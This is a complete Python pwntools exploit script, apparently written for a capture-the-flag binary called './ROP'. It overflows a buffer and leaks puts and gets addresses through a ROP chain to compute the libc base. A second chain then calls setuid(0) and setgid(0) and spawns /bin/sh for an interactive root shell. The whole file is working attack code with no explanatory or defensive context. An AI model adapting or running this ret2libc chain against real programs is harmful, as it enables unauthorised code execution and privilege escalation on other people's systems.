#!/usr/bin/env python


from pwn import *

context.arch = 'amd64'
context.terminal = 'zsh'

elf = ELF("./ROP")

p = elf.process()

rop = ROP(elf)

rop.call(elf.symbols["puts"],[elf.got['puts']])
rop.call(elf.symbols["puts"],[elf.got['gets']])
rop.call(elf.symbols["vuln"])


offset = 56


p.recvuntil("\n")

p.recvuntil("\n")


payload = [


    b"A"*offset,

    rop.chain()

]


payload = b"".join(payload)


p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b'\x00'))
gets = u64(p.recvuntil("\n").rstrip().ljust(8, b'\x00'))

log.info(f"puts found at {hex(puts)} ")
log.info(f"gets found at {hex(gets)} ")

libc = ELF("libc6_2.41-12_amd64.so")

libc.address = puts - libc.symbols["puts"]

log.info(f"libc base address {hex(libc.address)} ")

rop = ROP(libc)

rop.raw(rop.find_gadget(['ret'])[0])

rop.setuid(0)

rop.raw(rop.find_gadget(['ret'])[0])

rop.setgid(0)

rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])

rop.call(libc.symbols["exit"])


payload = [


        b"A"*offset,

        rop.chain()

]


payload = b"".join(payload)

p.sendline(payload)

p.interactive()
